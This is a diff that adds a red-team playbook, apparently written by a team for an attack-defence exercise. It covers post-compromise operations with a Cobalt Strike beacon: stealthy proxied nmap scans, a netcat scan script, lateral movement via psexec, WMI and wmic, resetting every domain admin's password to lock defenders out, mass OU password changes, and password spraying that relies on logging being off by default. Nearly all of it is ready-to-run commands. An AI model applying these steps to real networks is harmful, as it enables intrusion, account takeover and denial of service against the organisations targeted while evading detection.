@@ -1,0 +1,124 @@
+Play Book
+This is a play book created by team 4 for the purposes of stealth scan and lateral movement 
+from one network to another. 
+
+
+
+
+Stealth Scan execution of operations
+
+
+-Assume that Cobalt Strike is already set up
+-Assume that a computer is already compromised with a Cobalt Strike beacon 
+
+
+1. Modify the proxychains config file to utilize the port that you will be opening up via your cobalt strike beacon to push your commands through the Cobalt Strike framework. The config file is located at   /etc/proxychains.config
+-The last line of the config file has the ip address and the default port used for proxychains you will need to make sure the ip/port match with your cobalt strike server and port you will be opening up with the socks command to follow
+Command: vim /etc/proxychains.conf
+Command: scroll to the bottom and effect changes to file ip and port
+
+2. From within Cobalt Strike, right click your beacon and select interact
+3. Find the console at the bottom of the window, type in:
+   1. socks <port you select (must not be in use by another service)>
+4. Open up a terminal in Kali, type in:
+   1. proxychains nmap -Pn  -f -sT -T4 --data-length 20 --randomize-hosts -v <TARGET_IP/ RANGE> -oA <NAME OF OUTPUT FILE>
+   2. It is recommended to break up the scan into smaller chunks 
+   3. Alternate to the nmap scan will be the nc scan script located below due to time constraints
+
+
+#!/bin/bash
+echo "enter the network address (first 3 octets)(ex. xxx.xxx.xxx): "
+read net
+echo "enter the starting ip address (ex. 1): "
+read start
+echo "enter the ending ip addrress (ex. 255): "
+read end
+echo "enter the ports you wish to scan (ex. 20-25 80): "
+read port
+
+
+for ((i=$start; $i<=$end; i++))
+do
+        nc -nvzw1 $net.$i $port 2>&1 | grep open
+done
+
+
+
+
+
+
+
+
+
+
+
+
+Lateral Movement execution of operations
+
+
+-assume samba beacon for lateral movement 
+
+
+1.        Your SMB listener works with a parent listener and is utilized for its named pipe for c2 reasons
+2.        To create an SMB listener go to your listener tab in Cobalt Strike         click ‘add’ and select from the drop down SMB and input a name for your pipe lastly you need to give a descriptive name for your beacon
+3.        From your interactive beacon you will select one of the following                         methods for lateral movement 
+-jump psexec_psh <IP> <SMB Listener> 
+-jump psexec <IP> <SMB Listener>
+ -jump wmi <IP> <SMB Listener>
+
+Alternate method for lateral movement would be through the gui.
+- right click on the target you want to jump to through the targets list in cobalt strike
+- select jump from the menu
+- from there you can select one of the options that was presented above or psexec64. Psexec64 works reliably as well.
+-select the smb listener from the drop down menu
+- select the user you would like to use or click the check box at the bottom to use the same user token as the current session
+- select the beacon to go through and execute
+
+
+
+
+The following steps follow after the creation of a SMB beacon, if instructions for that are needed reference https://www.cobaltstrike.com/help-smb-beacon.
+
+
+## Old School Method upload <executable/dll> shell copy <executable/dll> <Remote Location> wmic /node:ComputerName process call create "cmd.exe /c <executable/dll>"
+
+
+
+
+
+
+Denial of Service execution of operations
+
+
+1. shell net group "domain admins" /domain
+2. #This will spit out all the domain admins and will use this list for the next command
+3. shell net user <admin account> Pwn3dddd /domain
+4. #Repeat line 3 with all the users
+
+
+
+
+1.to change the passwords of a certain ou you will need to identify what ou’s are available to change in order to do so you will run the command in powershell through cobalt strike must be done on a user account you are trying to change the password for
+* Powershell whoami /fqdn
+2.once this is accomplished you will use the output and plug it into the command below and all users in the same ou will have their password changes 
+
+
+DSQUERY user "OU=myOU,OU=myUsers,DC=myDomain,DC=loc" -limit 0 | DSMOD user -pwd <insert new password here>
+
+
+
+
+
+
+Type 2 
+Spray-AD
+
+
+This is a cobaltstrike script that needs to be loaded into cobaltstirke via the script manager under the cobalt strike drop down in the very top right of cobalt strike.
+-once you have that open you will select open and then navigate to where you stored the script and upload
+
+
+-syntax will be Spray-AD <password>
+
+
+This will create a kerberous failed authentication event (event id 4771) in the logs however this log is not turned on by default
